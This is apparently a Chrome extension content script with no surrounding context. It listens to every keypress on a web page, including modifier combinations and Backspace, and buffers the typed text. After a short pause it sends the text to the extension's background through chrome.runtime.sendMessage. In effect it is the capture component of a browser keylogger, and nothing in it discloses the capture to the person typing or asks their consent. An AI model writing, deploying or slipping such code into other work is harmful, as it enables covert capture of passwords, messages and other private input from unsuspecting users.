let buffer = "";
let timeoutId;

function debounceLogger() {
  console.log("Final input:", buffer.trim());
  chrome.runtime.sendMessage({ action: 'keystroke', text: buffer.trim() });
  buffer = "";
}

document.addEventListener('keydown', (event) => {
  const { key, ctrlKey, altKey, shiftKey, metaKey } = event;


  let combo = "";

  if (ctrlKey) combo += "Ctrl+";
  if (altKey) combo += "Alt+";
  if (shiftKey) combo += "Shift+";
  if (metaKey) combo += "Meta+"; 
  
  let normalizedKey = key;

  if (
    key === "Control" ||
    key === "Shift" ||
    key === "Alt" ||
    key === "Meta"
  ) {
    return;
  }

  if (key.length === 1 || key === ' ' || key === 'Enter' || key === 'Backspace') {
    if (ctrlKey || altKey || shiftKey || metaKey) {
      combo += key;
      buffer += `[${combo}] `;
    } else {
      if (key === 'Backspace') {
        buffer = buffer.slice(0, -1);
      } else if (key === 'Enter' || key === ' ') {
        buffer += ' ';
      } else {
        buffer += key;
      }
    }
  } else {
    combo += key;
    buffer += `[${combo}] `;
  }

  clearTimeout(timeoutId);
  timeoutId = setTimeout(debounceLogger, 500);
});
